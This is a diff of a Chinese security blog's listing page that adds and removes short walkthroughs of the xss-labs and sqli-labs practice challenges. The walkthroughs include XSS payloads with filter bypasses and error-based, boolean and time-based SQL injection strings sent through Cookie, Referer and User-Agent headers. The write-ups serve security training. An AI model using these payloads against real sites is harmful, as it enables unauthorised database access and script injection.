@@ -71,6 +71,261 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss-labs第6关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/19/xss-labs%E7%AC%AC6%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-04-19T12:02:12.466Z" itemprop="datePublished">2022-04-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/19/xss-labs%E7%AC%AC6%E5%85%B3/">xss-labs 6关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1.经测试替换了script，on，没有过滤&lt;&gt;。构造a标签，利用href属性支持javascript:伪协议构造poc，后台对href关键字进行替换，尝试采用大小写混写进行了绕过。</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/19/e2aef2ef20791176.png" alt="image-20220419190016436"></p>
+<p>2.后台源代码分析。对get提交的keyword变量，替换&lt;script 、on、src、data、href关键字，采用htmlspecialchars过滤后输出在html中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/19/xss-labs%E7%AC%AC6%E5%85%B3/" data-id="cl264s8fs000510ts7h881ar7" data-title="xss-labs 6关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-xss-labs第2关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/19/xss-labs%E7%AC%AC2%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-04-19T12:02:12.461Z" itemprop="datePublished">2022-04-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/19/xss-labs%E7%AC%AC2%E5%85%B3/">xss-labs 2关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>1.利用name参数提交poc，查看返回的html代码，需要构造闭合</p>
+<p>2.构造闭合，浏览器响应poc。</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/19/e2aef2ef20791176.png" alt="image-20220419182514583"></p>
+<p>3.后台源代码分析</p>
+<p>获取浏览器提交的keyword值，未进行过滤，输出在<input name="keyword" value="'.$str.'">。</p>
+<p>如果是keyword提交的是<script>alert(xss)</script>,返回的就会是<input name="keyword" value="<script>alert(1)</script>">,javascript引擎并不会执行<script>,所以需要构造闭合。</p>
+<p>keyword提交test"><script>alert(1)</script>&#x2F;&#x2F;,php处理后返回的html就会是<input name="keyword" value="test"> <script>alert(1)</script>&#x2F;&#x2F;“&gt;，&#x2F;&#x2F;是注释的作用，javascript引擎执行<script>alert(1)</script></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/19/xss-labs%E7%AC%AC2%E5%85%B3/" data-id="cl264s8fp000110tsg5b74aw4" data-title="xss-labs 2关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sqli-labs第20关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/30/sqli-labs%E7%AC%AC20%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-03-30T02:48:14.878Z" itemprop="datePublished">2022-03-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC20%E5%85%B3/">sql-labs 20关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>less-20——基于’的<code>Cookie:</code>报头文报错注入</p>
+<p>注入语句：</p>
+<p>uname&#x3D;’ union select 1,2,(updatexml(1,concat(0x7e, database(),0x7e),1))# ;</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/b66cd37ffb7f19ad.png" alt="image-20220330104652217"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/67ecd6292a71785e.png" alt="image-20220330104702725"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC20%E5%85%B3/" data-id="cl1czhrsd000b5gts77fbfmuj" data-title="sql-labs 20关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sqli-labs第19关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/30/sqli-labs%E7%AC%AC19%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-03-30T02:48:14.874Z" itemprop="datePublished">2022-03-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC19%E5%85%B3/">sql-labs 19关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>less-19——基于’的<code>Referer:</code>报头文报错注入</p>
+<p>注入语句： ‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/47c98c43ece66b32.png" alt="image-20220330104000179"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/f4a3d1f76445b4d7.png" alt="image-20220330104009360"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC19%E5%85%B3/" data-id="cl1czhrsc00095gtsg30ph82i" data-title="sql-labs 19关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sqli-labs第18关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/30/sqli-labs%E7%AC%AC18%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-03-30T02:48:14.870Z" itemprop="datePublished">2022-03-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC18%E5%85%B3/">sql-labs 18关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>less-18——基于’的<code>User-Agent:</code>报头文报错注入</p>
+<p>注入语句：’,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/f1f12802b8ccbbac.png" alt="image-20220330103739871"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/01/5e70a8bb7c050aa2.png" alt="image-20220330103749270"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC18%E5%85%B3/" data-id="cl1czhrsa00075gtsf3r2d1dy" data-title="sql-labs 18关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sqli-labs第17关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/30/sqli-labs%E7%AC%AC17%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-03-30T02:48:14.867Z" itemprop="datePublished">2022-03-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC17%E5%85%B3/">sql-labs 17关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>less-17——基于’的密码报错注入</p>
+<p>注入语句：’ and (updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/870bf235e9097ebd.png" alt="image-20220330103508537"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/fcb71e744d699675.png" alt="image-20220330103544359"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC17%E5%85%B3/" data-id="cl1czhrsb00085gts76fvhtgo" data-title="sql-labs 17关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sqli-labs第16关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/03/30/sqli-labs%E7%AC%AC16%E5%85%B3/" class="article-date">
@@ -234,266 +489,11 @@
 
 
   
-    <article id="post-sqli-labs第12关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC12%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.848Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC12%E5%85%B3/">sql-labs 12关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>less-12——基于”)的POST型注入</p>
-<p>注入语句：admin”) and 1&#x3D;1 –+</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/0f33d9832d489797.png" alt="image-20220330102005739"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC12%E5%85%B3/" data-id="cl1czhrs700025gtsg1p2emz5" data-title="sql-labs 12关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs第11关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC11%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.844Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC11%E5%85%B3/">sql-labs 11关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Less-11</strong> POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</p>
-<p>注入语句：admin’ and 1&#x3D;1 –+</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/41d7b337733288a8.png" alt="image-20220330101425259"></p>
-<p>这里不用密码也能登陆成功，所以判断是POST形式的单引号字符型注入</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/ef8af409734f5fb7.png" alt="image-20220330101729185"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC11%E5%85%B3/" data-id="cl1czhrs600015gts94rp73qj" data-title="sql-labs 11关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs第10关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC10%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.841Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC10%E5%85%B3/">sql-labs 10关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Less-10</strong> GET - Blind - Time based - double quotes (基于时间的双引号盲注)</p>
-<p>注入语句：id&#x3D;1” and if(length(database())&gt;7 ,sleep(5),1) –+</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/fc59241b3ec93e3c.png" alt="image-20220330101130633"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC10%E5%85%B3/" data-id="cl1czhrs200005gtshltbedx5" data-title="sql-labs 10关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs第9关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC9%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.837Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC9%E5%85%B3/">sql-labs 9关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Less-9</strong> GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注&#x2F;基于’的时间盲注)</p>
-<p>注入语句：id&#x3D;1’ and if(length(database())&gt;3 ,sleep(5),1) –+</p>
-<p>因为你不知道数据库名是几个字母，所以先让数字大于3进行判断，然后依次增加。</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/a06829add4dd7703.png" alt="image-20220330100800597"></p>
-<p>如果sleep函数不起作用了，说明数据库名可能等于这个数。这时你就能判断它的数据库名啦。</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/ee8a83aedc25f26c.png" alt="image-20220330100906860"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC9%E5%85%B3/" data-id="cl1czhrsg000g5gts4eupbxsb" data-title="sql-labs 9关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs第8关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC8%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.833Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC8%E5%85%B3/">sql-labs 8关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Less-8</strong> GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注&#x2F;基于’的盲注（利用dns回显）)</p>
-<p>布尔型盲注，单引号，id&#x3D;1回显，价格单引号不回显，构造一下验证是不是布尔型payload ?id&#x3D;1’ and 1&#x3D;1 –+ 回显了</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/94113ca23fb74db3.png" alt="image-20220330095718100"></p>
-<p>暴库payload</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/ffe574c05c9d7d8e.png" alt="image-20220330100154595"></p>
-<p>库名长度可使用?id&#x3D;1’ and length(database())&#x3D;8–+ 判断，同理表名字，段名等。</p>
-<p>最后得到库名?id&#x3D;1’ and left((select database()),8)&#x3D;’security’–+</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC8%E5%85%B3/" data-id="cl1czhrsf000e5gts9jdn3izx" data-title="sql-labs 8关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sqli-labs第7关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/30/sqli-labs%E7%AC%AC7%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-03-30T02:48:14.829Z" itemprop="datePublished">2022-03-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/30/sqli-labs%E7%AC%AC7%E5%85%B3/">sql-labs 7关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Less-7</strong> GET - Dump into outfile - String （导出文件GET字符型注入&#x2F;文件读写注入）</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/ad4836077f2cf202.png" alt="image-20220330094355325"></p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/03/31/658f4a08244f92b8.png" alt="image-20220330095322863"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/30/sqli-labs%E7%AC%AC7%E5%85%B3/" data-id="cl1czhrse000d5gts8qn91tmz" data-title="sql-labs 7关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -525,23 +525,23 @@
       <ul>
         
           <li>
-            <a href="/2022/04/19/xss-labs%E7%AC%AC1%E5%85%B3/">xss-labs 1关</a>
+            <a href="/2022/04/20/xss-labs%E7%AC%AC11%E5%85%B3%20/">xss-labs第11关</a>
           </li>
         
           <li>
-            <a href="/2022/04/19/xss-labs%E7%AC%AC5%E5%85%B3%20/">xss-labs 5关</a>
+            <a href="/2022/04/20/xss-labs%E7%AC%AC12%E5%85%B3%20/">xss-labs第12关</a>
           </li>
         
           <li>
-            <a href="/2022/04/19/xss-labs%E7%AC%AC4%E5%85%B3/">xss-labs 4关</a>
+            <a href="/2022/04/20/xss-labs%E7%AC%AC10%E5%85%B3/">xss-labs第10关</a>
           </li>
         
           <li>
-            <a href="/2022/04/19/xss-labs%E7%AC%AC3%E5%85%B3/">xss-labs 3关</a>
+            <a href="/2022/04/20/xss-labs%E7%AC%AC9%E5%85%B3/">xss-labs第9关</a>
           </li>
         
           <li>
-            <a href="/2022/04/19/xss-labs%E7%AC%AC6%E5%85%B3/">xss-labs 6关</a>
+            <a href="/2022/04/20/xss-labs%E7%AC%AC8%E5%85%B3/">xss-labs 8关</a>
           </li>
         
       </ul>
